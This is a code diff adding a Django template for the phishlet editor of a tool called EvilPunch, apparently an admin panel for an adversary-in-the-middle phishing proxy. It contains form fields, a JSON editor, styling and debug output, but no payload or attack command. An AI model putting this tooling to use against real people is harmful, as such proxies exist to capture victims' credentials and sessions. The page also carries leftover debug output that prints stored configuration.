@@ -1,0 +1,644 @@
+{% extends 'base.html' %}
+{% block title %}{{ instance|default_if_none:'New' }} Phishlet · EvilPunch{% endblock %}
+{% block content %}
+<div class="container-fluid py-4">
+  <div class="row justify-content-center">
+    <div class="col-12 col-xl-10">
+      <!-- Header Section -->
+      <div class="d-flex justify-content-between align-items-center mb-4">
+        <div>
+          <h1 class="h3 mb-1 text-white">
+            <i class="fas fa-file-code me-2 text-primary"></i>
+            {{ instance|default_if_none:'Create New' }} Phishlet
+          </h1>
+          <p class="text-muted mb-0">Configure phishlet settings and JSON data</p>
+        </div>
+        <a href="{% url 'phishlet_list' %}" class="btn btn-outline-light">
+          <i class="fas fa-arrow-left me-2"></i>Back to List
+        </a>
+      </div>
+
+      <!-- Main Form Card -->
+      <div class="card card-dark shadow-lg">
+        <div class="card-header bg-gradient-primary text-white">
+          <h5 class="mb-0">
+            <i class="fas fa-cog me-2"></i>Phishlet Configuration
+          </h5>
+        </div>
+        <div class="card-body p-4">
+          <form method="post" id="phishlet-form" 
+                {% if instance.data %}data-instance-data="{{ instance.data|escapejs }}"{% endif %}>
+            {% csrf_token %}
+            
+            <!-- Basic Settings Row -->
+            <div class="row g-4 mb-4">
+              <!-- Name Field -->
+              <div class="col-md-6">
+                <div class="form-group">
+                  <label class="form-label fw-semibold text-white">
+                    <i class="fas fa-tag me-2 text-primary"></i>Name
+                  </label>
+                  <div class="input-group">
+                    <span class="input-group-text bg-dark border-secondary">
+                      <i class="fas fa-file-code text-muted"></i>
+                    </span>
+                    {{ form.name }}
+                  </div>
+                  {% if form.name.errors %}
+                    <div class="invalid-feedback d-block">
+                      <i class="fas fa-exclamation-triangle me-1"></i>
+                      {{ form.name.errors.0 }}
+                    </div>
+                  {% endif %}
+                  <div class="form-text text-muted">
+                    <i class="fas fa-info-circle me-1"></i>
+                    Unique identifier used as filename (letters, numbers, hyphens, underscores only)
+                  </div>
+                </div>
+              </div>
+              
+              <!-- Proxy Auth Field -->
+              <div class="col-md-6">
+                <div class="form-group">
+                  <label class="form-label fw-semibold text-white">
+                    <i class="fas fa-shield-alt me-2 text-primary"></i>Proxy Auth Path
+                  </label>
+                  <div class="input-group">
+                    <span class="input-group-text bg-dark border-secondary">
+                      <i class="fas fa-key text-muted"></i>
+                    </span>
+                    {{ form.proxy_auth }}
+                    <button type="button" class="btn btn-outline-primary" id="generate-auth-path" title="Generate random path">
+                      <i class="fas fa-random me-1"></i>Generate
+                    </button>
+                  </div>
+                  {% if form.proxy_auth.errors %}
+                    <div class="invalid-feedback d-block">
+                      <i class="fas fa-exclamation-triangle me-1"></i>
+                      {{ form.proxy_auth.errors.0 }}
+                    </div>
+                  {% endif %}
+                  <div class="form-text text-muted">
+                    <i class="fas fa-info-circle me-1"></i>
+                    Random URL path for proxy authentication (e.g., /auth/abc123, /secret/xyz789)
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Active Status and Proxy Row -->
+            <div class="row g-4 mb-4">
+              <!-- Active Status -->
+              <div class="col-md-6">
+                <div class="form-check form-switch">
+                  {{ form.is_active }}
+                  <label class="form-check-label fw-semibold text-white" for="{{ form.is_active.id_for_label }}">
+                    <i class="fas fa-toggle-on me-2 text-success"></i>Active
+                  </label>
+                  <div class="form-text text-muted ms-4">
+                    <i class="fas fa-info-circle me-1"></i>
+                    Enable this phishlet for active use
+                  </div>
+                </div>
+              </div>
+              
+              <!-- Proxy Selection -->
+              <div class="col-md-6">
+                <div class="form-group">
+                  <label class="form-label fw-semibold text-white">
+                    <i class="fas fa-network-wired me-2 text-primary"></i>Proxy Server
+                  </label>
+                  <div class="input-group">
+                    <span class="input-group-text bg-dark border-secondary">
+                      <i class="fas fa-server text-muted"></i>
+                    </span>
+                    {{ form.proxy }}
+                  </div>
+                  {% if form.proxy.errors %}
+                    <div class="invalid-feedback d-block">
+                      <i class="fas fa-exclamation-triangle me-1"></i>
+                      {{ form.proxy.errors.0 }}
+                    </div>
+                  {% endif %}
+                  <div class="form-text text-muted">
+                    <i class="fas fa-info-circle me-1"></i>
+                    Select a proxy server for this phishlet (optional)
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- JSON Editor Section -->
+            <div class="form-group">
+              <label class="form-label fw-semibold text-white mb-3">
+                <i class="fas fa-code me-2 text-primary"></i>Phishlet Data (JSON)
+              </label>
+              
+              <!-- Hidden form field -->
+              <div class="d-none">
+                {{ form.data }}
+              </div>
+              
+              <!-- Debug: Show what's in the form field -->
+              <div class="text-muted small mt-2 mb-3">
+                <strong>Debug Info:</strong><br>
+                Form field ID: {{ form.data.id_for_label }}<br>
+                Form field value length: {{ form.data.value|length|default:0 }}<br>
+                Instance data available: {% if instance.data %}Yes ({{ instance.data|length }} chars){% else %}No{% endif %}<br>
+                Form data attribute: {% if instance.data %}{{ instance.data|escapejs|truncatechars:100 }}{% else %}None{% endif %}
+              </div>
+              
+              <!-- JSON Editor Container -->
+              <div class="json-editor-container">
+                <div id="json-editor" class="json-editor"></div>
+                <div class="json-editor-toolbar">
+                  <div class="d-flex gap-2 align-items-center">
+                    <button type="button" id="btn-format-json" class="btn btn-outline-primary btn-sm">
+                      <i class="fas fa-magic me-1"></i>Format JSON
+                    </button>
+                    <button type="button" id="btn-validate-json" class="btn btn-outline-info btn-sm">
+                      <i class="fas fa-check me-1"></i>Validate
+                    </button>
+                    <span class="json-status ms-auto">
+                      <i class="fas fa-circle text-muted me-1"></i>
+                      <span class="status-text">Ready</span>
+                    </span>
+                  </div>
+                </div>
+              </div>
+              
+              <!-- Error Display -->
+              <div id="data-error" class="alert alert-danger mt-3" style="display:none;">
+                <i class="fas fa-exclamation-triangle me-2"></i>
+                <span class="error-message"></span>
+              </div>
+              
+              {% if form.data.errors %}
+                <div class="alert alert-danger mt-3">
+                  <i class="fas fa-exclamation-triangle me-2"></i>
+                  {{ form.data.errors.0 }}
+                </div>
+              {% endif %}
+              
+              <div class="form-text text-muted mt-2">
+                <i class="fas fa-info-circle me-1"></i>
+                Enter valid JSON configuration for the phishlet. Use the Format button to prettify your JSON.
+              </div>
+              
+
+            </div>
+
+            <!-- Form Actions -->
+            <div class="d-flex gap-3 mt-5 pt-3 border-top border-secondary">
+              <button class="btn btn-primary btn-lg px-4" type="submit" id="submit-btn">
+                <i class="fas fa-save me-2"></i>
+                {% if instance %}Update{% else %}Create{% endif %} Phishlet
+              </button>
+              <a href="{% url 'phishlet_list' %}" class="btn btn-outline-secondary btn-lg px-4">
+                <i class="fas fa-times me-2"></i>Cancel
+              </a>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Custom Styles for JSON Editor -->
+<style>
+.json-editor-container {
+  border: 2px solid #293056;
+  border-radius: 12px;
+  overflow: hidden;
+  background: #0a0f1a;
+}
+
+.json-editor {
+  height: 500px;
+  background: #0a0f1a;
+}
+
+.json-editor-toolbar {
+  background: #11162a;
+  border-top: 1px solid #293056;
+  padding: 12px 16px;
+}
+
+.json-status {
+  font-size: 0.875rem;
+  color: #a3acc7;
+}
+
+.json-status .fa-circle.text-success {
+  color: #28a745 !important;
+}
+
+.json-status .fa-circle.text-danger {
+  color: #dc3545 !important;
+}
+
+.json-status .fa-circle.text-warning {
+  color: #ffc107 !important;
+}
+
+/* Enhanced form styling */
+.form-control, .form-select {
+  background-color: #0e1430;
+  color: #e9ecf5;
+  border: 2px solid #293056;
+  border-radius: 8px;
+  padding: 12px 16px;
+  font-size: 14px;
+  transition: all 0.3s ease;
+}
+
+.form-control:focus, .form-select:focus {
+  background-color: #0e1430;
+  color: #fff;
+  border-color: #4361ee;
+  box-shadow: 0 0 0 0.25rem rgba(67, 97, 238, 0.25);
+  transform: translateY(-1px);
+}
+
+.input-group-text {
+  background-color: #1c274b;
+  border: 2px solid #293056;
+  border-right: none;
+  color: #a3acc7;
+  border-radius: 8px 0 0 8px;
+}
+
+.input-group .form-control {
+  border-left: none;
+  border-radius: 0 8px 8px 0;
+}
+
+.form-check-input {
+  width: 3rem;
+  height: 1.5rem;
+  background-color: #0e1430;
+  border: 2px solid #293056;
+  border-radius: 1rem;
+}
+
+.form-check-input:checked {
+  background-color: #28a745;
+  border-color: #28a745;
+}
+
+.form-check-input:focus {
+  box-shadow: 0 0 0 0.25rem rgba(40, 167, 69, 0.25);
+}
+
+/* Button enhancements */
+.btn {
+  border-radius: 8px;
+  font-weight: 500;
+  transition: all 0.3s ease;
+  border: 2px solid transparent;
+}
+
+.btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+}
+
+.btn-primary {
+  background: linear-gradient(135deg, #4361ee, #3a0ca3);
+  border: none;
+  box-shadow: 0 6px 20px rgba(67, 97, 238, 0.3);
+}
+
+.btn-primary:hover {
+  background: linear-gradient(135deg, #4f6bf7, #4a1bb8);
+  box-shadow: 0 8px 25px rgba(67, 97, 238, 0.4);
+}
+
+.btn-outline-primary {
+  border-color: #4361ee;
+  color: #4361ee;
+  background: transparent;
+}
+
+.btn-outline-primary:hover {
+  background-color: #4361ee;
+  border-color: #4361ee;
+  color: #fff;
+}
+
+/* Card enhancements */
+.card-dark {
+  background: linear-gradient(135deg, #11162a, #0e1530);
+  border: 1px solid #293056;
+  border-radius: 16px;
+  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+}
+
+.card-header.bg-gradient-primary {
+  background: linear-gradient(135deg, #4361ee, #3a0ca3) !important;
+  border-bottom: 1px solid #293056;
+  border-radius: 16px 16px 0 0;
+}
+
+/* Form group spacing */
+.form-group {
+  margin-bottom: 1.5rem;
+}
+
+.form-label {
+  font-size: 0.95rem;
+  margin-bottom: 0.5rem;
+  color: #f6f7fb;
+}
+
+.form-text {
+  font-size: 0.85rem;
+  margin-top: 0.5rem;
+}
+
+/* Alert styling */
+.alert {
+  border-radius: 8px;
+  border: none;
+  padding: 12px 16px;
+}
+
+.alert-danger {
+  background-color: rgba(220, 53, 69, 0.1);
+  color: #f8d7da;
+  border-left: 4px solid #dc3545;
+}
+
+/* Responsive adjustments */
+@media (max-width: 768px) {
+  .json-editor {
+    height: 400px;
+  }
+  
+  .d-flex.gap-3 {
+    flex-direction: column;
+  }
+  
+  .btn-lg {
+    padding: 12px 24px;
+  }
+}
+</style>
+
+<!-- Scripts -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.3/ace.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+(function() {
+  let editor = null;
+  let jsonStatus = null;
+  let statusText = null;
+  let errorDisplay = null;
+  let errorMessage = null;
+
+  function initJsonEditor() {
+    const textarea = document.getElementById('id_data');
+    if (!textarea || typeof ace === 'undefined') return;
+
+    try { 
+      ace.config.set('basePath', 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.3/'); 
+    } catch (_) {}
+
+    // Initialize ACE editor
+    editor = ace.edit('json-editor');
+    try { 
+      editor.setTheme('ace/theme/monokai'); 
+    } catch (_) {}
+    
+    editor.session.setMode('ace/mode/json');
+    editor.session.setUseWorker(true);
+    editor.session.setTabSize(2);
+    editor.session.setUseSoftTabs(true);
+    editor.setFontSize(14);
+    editor.setShowPrintMargin(false);
+    editor.renderer.setShowGutter(true);
+    editor.setHighlightActiveLine(true);
+
+    // Set initial value - try to get existing data
+    let initial = '';
+    
+    // Debug: Log textarea details
+    console.log('Textarea element:', textarea);
+    console.log('Textarea value:', textarea.value);
+    console.log('Textarea value length:', textarea.value ? textarea.value.length : 0);
+    console.log('Textarea HTML:', textarea.outerHTML);
+    
+    // Debug: Check form data attribute
+    const formElement = textarea.closest('form');
+    if (formElement) {
+      console.log('Form element:', formElement);
+      console.log('Form dataset:', formElement.dataset);
+      console.log('Form data-instance-data:', formElement.dataset.instanceData);
+      if (formElement.dataset.instanceData) {
+        console.log('Form data-instance-data length:', formElement.dataset.instanceData.length);
+      }
+    }
+    
+    // First try to get from the hidden textarea
+    if (textarea.value) {
+      initial = textarea.value.trim();
+      console.log('Found initial value in textarea:', initial);
+    }
+    
+    // Fallback: If no textarea value, try to get from form data attribute
+    if (!initial) {
+      const form = textarea.closest('form');
+      if (form && form.dataset.instanceData) {
+        try {
+          const instanceData = JSON.parse(form.dataset.instanceData);
+          initial = JSON.stringify(instanceData);
+          console.log('Found initial value from form data attribute:', initial);
+        } catch (e) {
+          console.error('Error parsing instance data from form attribute:', e);
+        }
+      }
+    }
+    
+
+    
+    if (initial) {
+      try {
+        const parsed = JSON.parse(initial);
+        editor.setValue(JSON.stringify(parsed, null, 2), -1);
+        updateStatus('success', 'Existing data loaded');
+        console.log('Successfully loaded existing data');
+      } catch (e) {
+        console.error('Error parsing existing data:', e);
+        editor.setValue(initial, -1);
+        updateStatus('danger', 'Invalid JSON - check console');
+      }
+    } else {
+      // Set default template
+      const defaultTemplate = {
+        name: "{{ form.name.value|default:'example' }}",
+        description: "Phishlet description",
+        hosts_to_proxy: ["example.com"],
+        settings: {
+          enabled: true
+        }
+      };
+      editor.setValue(JSON.stringify(defaultTemplate, null, 2), -1);
+      updateStatus('info', 'Template loaded');
+      console.log('No existing data found, loaded template');
+    }
+
+    // Setup form submission
+    const form = textarea.closest('form');
+    if (form) {
+      form.addEventListener('submit', handleFormSubmit);
+    }
+
+    // Setup toolbar buttons
+    setupToolbarButtons();
+    
+    // Setup editor change listener
+    editor.session.on('change', handleEditorChange);
+  }
+
+  function setupToolbarButtons() {
+    // Format JSON button
+    const formatBtn = document.getElementById('btn-format-json');
+    if (formatBtn) {
+      formatBtn.addEventListener('click', formatJson);
+    }
+
+    // Validate JSON button
+    const validateBtn = document.getElementById('btn-validate-json');
+    if (validateBtn) {
+      validateBtn.addEventListener('click', validateJson);
+    }
+  }
+
+  function handleEditorChange() {
+    const value = editor.getValue().trim();
+    if (value === '') {
+      updateStatus('warning', 'Empty content');
+      return;
+    }
+    
+    try {
+      JSON.parse(value);
+      updateStatus('success', 'Valid JSON');
+      hideError();
+    } catch (e) {
+      updateStatus('danger', 'Invalid JSON');
+    }
+  }
+
+  function handleFormSubmit(e) {
+    const val = editor.getValue().trim();
+    const textarea = document.getElementById('id_data');
+    
+    if (!val) {
+      e.preventDefault();
+      showError('JSON data cannot be empty');
+      return;
+    }
+    
+    try {
+      const obj = JSON.parse(val);
+      textarea.value = JSON.stringify(obj);
+      updateStatus('success', 'Form submitted');
+      hideError();
+    } catch (err) {
+      e.preventDefault();
+      showError('Invalid JSON: ' + err.message);
+    }
+  }
+
+  function formatJson() {
+    try {
+      const obj = JSON.parse(editor.getValue());
+      editor.setValue(JSON.stringify(obj, null, 2), -1);
+      updateStatus('success', 'JSON formatted');
+      hideError();
+    } catch (err) {
+      showError('Cannot format invalid JSON: ' + err.message);
+    }
+  }
+
+  function validateJson() {
+    try {
+      const obj = JSON.parse(editor.getValue());
+      updateStatus('success', 'Valid JSON ✓');
+      hideError();
+      return true;
+    } catch (err) {
+      updateStatus('danger', 'Invalid JSON ✗');
+      showError('JSON validation failed: ' + err.message);
+      return false;
+    }
+  }
+
+  function updateStatus(type, message) {
+    if (!jsonStatus || !statusText) return;
+    
+    jsonStatus.className = `fas fa-circle text-${type} me-1`;
+    statusText.textContent = message;
+  }
+
+  function showError(message) {
+    if (!errorDisplay || !errorMessage) return;
+    
+    errorMessage.textContent = message;
+    errorDisplay.style.display = 'block';
+  }
+
+  function hideError() {
+    if (!errorDisplay) return;
+    errorDisplay.style.display = 'none';
+  }
+
+  // Generate random proxy auth path
+  function setupAuthPathGenerator() {
+    const generateBtn = document.getElementById('generate-auth-path');
+    if (generateBtn) {
+      generateBtn.addEventListener('click', function() {
+        const authField = document.getElementById('id_proxy_auth');
+        if (authField) {
+          const prefixes = ['/auth/', '/xxx/', '/secret/', '/private/', '/key/', '/access/', '/gate/', '/door/'];
+          const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+          const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+          let result = prefix;
+          for (let i = 0; i < 16; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+          }
+          authField.value = result;
+          
+          // Add visual feedback
+          authField.style.borderColor = '#28a745';
+          setTimeout(() => {
+            authField.style.borderColor = '#293056';
+          }, 1000);
+        }
+      });
+    }
+  }
+
+  // Initialize when DOM is ready
+  function init() {
+    // Get DOM elements
+    jsonStatus = document.querySelector('.json-status .fa-circle');
+    statusText = document.querySelector('.status-text');
+    errorDisplay = document.getElementById('data-error');
+    errorMessage = document.querySelector('.error-message');
+    
+    initJsonEditor();
+    setupAuthPathGenerator();
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+})();
+</script>
+{% endblock %}
+
+
